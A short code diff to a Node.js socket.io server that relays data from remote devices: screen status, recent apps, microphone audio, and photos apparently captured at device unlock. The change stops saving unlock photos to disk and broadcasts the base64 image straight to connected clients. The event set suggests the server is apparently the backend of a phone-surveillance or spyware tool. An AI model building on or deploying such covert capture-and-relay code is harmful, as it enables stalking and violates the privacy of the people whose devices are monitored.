@@ -95,16 +95,8 @@ io.on('connection', socket => {
     socket.on('screen:status',   data => io.emit('screen:status',   { deviceId, ...data }));
     socket.on('recent:apps',     data => io.emit('recent:apps',     { deviceId, ...data }));
     socket.on('unlock:photo', ({ frame, timestamp }) => {
-      try {
-        const folder = path.join(getScreenshotFolder(deviceId), 'UnlockPhotos');
-        fs.mkdirSync(folder, { recursive: true });
-        const ts = new Date(timestamp).toISOString().replace(/[:.]/g, '-');
-        const filename = `${ts}.jpg`;
-        const filepath = path.join(folder, filename);
-        fs.writeFileSync(filepath, Buffer.from(frame, 'base64'));
-        io.emit('unlock:photo:saved', { deviceId, filename, filepath,
-          url: `/media/${deviceId}/UnlockPhotos/${filename}`, timestamp });
-      } catch (err) { console.error('Unlock photo error:', err.message); }
+      // Send base64 directly — Railway filesystem is ephemeral so no disk storage
+      io.emit('unlock:photo:saved', { deviceId, frame, timestamp });
     });
     socket.on('mic:audio',       data => io.emit('mic:audio',       { deviceId, ...data }));
     socket.on('mic:state',       data => io.emit('mic:state',       { deviceId, ...data }));
